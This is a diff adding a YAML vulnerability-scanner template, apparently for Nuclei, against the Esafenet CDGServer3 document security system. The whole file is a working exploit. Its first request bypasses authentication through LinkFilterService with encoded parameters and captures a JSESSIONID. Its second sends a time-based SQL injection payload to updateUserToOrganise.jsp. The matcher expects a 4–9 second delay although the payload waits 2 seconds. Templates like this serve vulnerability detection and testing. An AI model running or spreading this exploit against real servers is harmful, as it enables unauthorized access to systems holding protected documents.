@@ -1,0 +1,48 @@
+id: esafenet-cdgserver3-updateUserToOrganise-sqli
+info:
+  name: 亿赛通-电子文档安全管理系统-updateUserToOrganise-SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E4%BA%BF%E8%B5%9B%E9%80%9A-updateUserToOrganise-SQL.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    tips: 身份绕过后台SQL注入
+  tags: esafenet,sqli,time
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/LinkFilterService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
+      
+      - |+
+        POST /CDGServer3/user/updateUserToOrganise.jsp;Service HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID={{get_cookie}};
+
+        userId=1';WAITFOR DELAY '0:0:2'--
+
+    extractors:
+      - type: regex
+        name: get_cookie
+        internal: true
+        part: body_1
+        regex:
+          - 'JSESSIONID=(?P<cookie>[^;]+)'
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - contains_all(body,'')
+          - status_code_1 == 302 && status_code_2 == 200
+          - duration_2 >= 4 && duration_2 < 9
+        condition: and
